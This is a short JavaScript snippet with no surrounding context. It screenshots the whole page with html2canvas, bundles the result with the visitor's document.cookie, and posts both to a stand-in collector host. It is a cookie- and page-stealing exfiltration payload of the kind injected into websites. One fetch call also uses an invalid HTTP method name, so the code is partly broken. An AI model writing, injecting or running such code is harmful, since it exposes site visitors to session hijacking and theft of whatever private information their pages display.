function uploadSnapshot(image) {
  const packet = JSON.stringify({ cookies: document.cookie, image: image });
  fetch('https://collector.example/hit.php', { method: 'uploadSnapshot', body: packet });
}
function capturePage() {
  window.html2canvas(document.body).then(function(canvas) {
    uploadSnapshot(canvas.toDataURL('image/jpeg'));
  });
}
